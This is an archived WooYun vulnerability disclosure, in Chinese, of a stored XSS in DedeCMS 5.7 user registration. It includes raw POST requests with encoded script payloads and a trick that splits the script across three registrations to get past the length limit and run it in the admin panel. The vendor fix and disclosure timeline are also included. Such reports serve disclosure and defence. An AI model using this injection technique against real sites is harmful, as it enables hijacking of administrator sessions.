@@ -1,0 +1,344 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		织梦5.7-新用户注册时打到后台的持久型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		织梦5.7-新用户注册时打到后台的持久型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/隐形小桃">隐形小桃</a> 
+</li><li>提交时间：		2014-01-11 19:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-17：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-03：	细节向普通白帽子公开<br/>
+									2014-02-23：	细节向实习白帽子公开<br/>
+									2014-04-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">在member/reg_new.php注册用户时，可以写入XSS攻击语句，打到后台。<br />
+虽然存在长度限制，但是可以通过如下方法绕过。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">长度测试：&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br />
+<br />
+POST /哔——/member/reg_new.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+dopost=regbase&amp;step=1&amp;mtype=%3cscript%3ealert(document.cookie)%3c%2fscript%3e&amp;mtype=%3cscript%3ealert(document.cookie)%3c%2fscript%3e&amp;userid=momotest2&amp;uname=momotest2&amp;userpwd=momotest205&amp;userpwdok=momotest205&amp;email=momo@momo.net&amp;safequestion=1&amp;safeanswer=momotest2&amp;sex=&amp;vdcode=DRIL&amp;agree=<br />
+<br />
+<br />
+<br />
+在后台输出时，长度受限：<br />
+<br />
+GET /哔——/member_main.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+HTTP/1.1 200 OK<br />
+<br />
+<br />
+<br />
+略<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	&lt;script&gt;alert(docume用户   	&lt;br /&gt;<br />
+<br />
+  	金币：0 积分：100  &lt;/td&gt;<br />
+<br />
+略<br />
+<br />
+<br />
+<br />
+因为输出长度受限，使用如下方法：<br />
+<br />
+<br />
+<br />
+第一次注册：插入XSS结束部分：*/&lt;/script&gt;<br />
+<br />
+POST /哔——/member/reg_new.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+dopost=regbase&amp;step=1&amp;mtype=*%2f%3c%2fscript%3e&amp;mtype=*%2f%3c%2fscript%3e&amp;userid=momoxss1&amp;uname=momoxss1&amp;userpwd=momoxss1&amp;userpwdok=momoxss1&amp;email=momo1@momo.net&amp;safequestion=1&amp;safeanswer=momoxss1&amp;sex=%E7%94%B7&amp;vdcode=cram&amp;agree=<br />
+<br />
+<br />
+<br />
+虽然返回错误信息，但其实已经注册成功。<br />
+<br />
+</p><p class="detail"><a href="../images/111919292af180b698b531ea461ef2d8d1f4330c.png" target="_blank"><img src="../images/111919292af180b698b531ea461ef2d8d1f4330c.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+第二次注册：插入XSS中间部分：*/alert();/*<br />
+<br />
+POST /哔——/member/reg_new.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+dopost=regbase&amp;step=1&amp;mtype=*%2falert()%3b%2f*&amp;mtype=*%2falert()%3b%2f*&amp;userid=momoxss2&amp;uname=momoxss2&amp;userpwd=momoxss2&amp;userpwdok=momoxss2&amp;email=momo2@momo.net&amp;safequestion=1&amp;safeanswer=lmomoxss2&amp;sex=%E7%94%B7&amp;vdcode=blun&amp;agree=<br />
+<br />
+<br />
+<br />
+图略<br />
+<br />
+<br />
+<br />
+第三次注册：插入XSS开始部分：&lt;script&gt;/*<br />
+<br />
+POST /哔——/member/reg_new.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+dopost=regbase&amp;step=1&amp;mtype=%3cscript%3e%2f*&amp;mtype=%3cscript%3e%2f*&amp;userid=momoxss3&amp;uname=momoxss3&amp;userpwd=momoxss3&amp;userpwdok=momoxss3&amp;email=momo3@momo.net&amp;safequestion=1&amp;safeanswer=momoxss3&amp;sex=%E7%94%B7&amp;vdcode=fris&amp;agree=<br />
+<br />
+<br />
+<br />
+由于在后台，注册用户会按从新到旧的顺序排列。故，最后将按3、2、1的顺序输出XSS语句：<br />
+<br />
+3：&lt;script&gt;/*<br />
+<br />
+2：*/alert();/*<br />
+<br />
+1：*/&lt;/script&gt; </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">访问后台：<br />
+<br />
+GET /哔——/member_main.php HTTP/1.0<br />
+<br />
+<br />
+<br />
+HTTP/1.1 200 OK<br />
+<br />
+<br />
+<br />
+略<br />
+<br />
+    &lt;u&gt;momoxss3&lt;/u&gt;  &lt;/a&gt;&lt;/td&gt;<br />
+<br />
+	&lt;td&gt;<br />
+<br />
+	  momo3@momo.net	  &lt;br /&gt;<br />
+<br />
+	  昵称：momoxss3	&lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	男  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	&lt;a href=&quot;member_main.php?rank=10&quot;&gt;注册会员&lt;/a&gt;<br />
+<br />
+  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	&lt;script&gt;/*用户   	&lt;br /&gt;<br />
+<br />
+  	金币：0 积分：100  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+略<br />
+<br />
+      &lt;u&gt;momoxss2&lt;/u&gt;  &lt;/a&gt;&lt;/td&gt;<br />
+<br />
+	&lt;td&gt;<br />
+<br />
+	  momo2@momo.net	  &lt;br /&gt;<br />
+<br />
+	  昵称：momoxss2	&lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	男  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	&lt;a href=&quot;member_main.php?rank=10&quot;&gt;注册会员&lt;/a&gt;<br />
+<br />
+  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	*/alert();/*用户   	&lt;br /&gt;<br />
+<br />
+  	金币：0 积分：100  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+略<br />
+<br />
+      &lt;u&gt;momoxss1&lt;/u&gt;  &lt;/a&gt;&lt;/td&gt;<br />
+<br />
+	&lt;td&gt;<br />
+<br />
+	  momo1@momo.net	  &lt;br /&gt;<br />
+<br />
+	  昵称：momoxss1	&lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	男  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	&lt;a href=&quot;member_main.php?rank=10&quot;&gt;注册会员&lt;/a&gt;<br />
+<br />
+  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+  	*/&lt;/script&gt;用户   	&lt;br /&gt;<br />
+<br />
+  	金币：0 积分：100  &lt;/td&gt;<br />
+<br />
+  &lt;td&gt;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/11193936153a4c9ac59c74a4333e9320d66405d3.png" target="_blank"><img src="../images/11193936153a4c9ac59c74a4333e9320d66405d3.png" alt="4.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤XSS字符，使用URL编码或者HTML编码输出。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/隐形小桃" title="隐形小桃">隐形小桃</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048603" title="织梦5.7-新用户注册时打到后台的持久型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：6 </p>
+													<p class="detail">确认时间：2014-01-14 08:18</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复，感谢提交</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48603";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
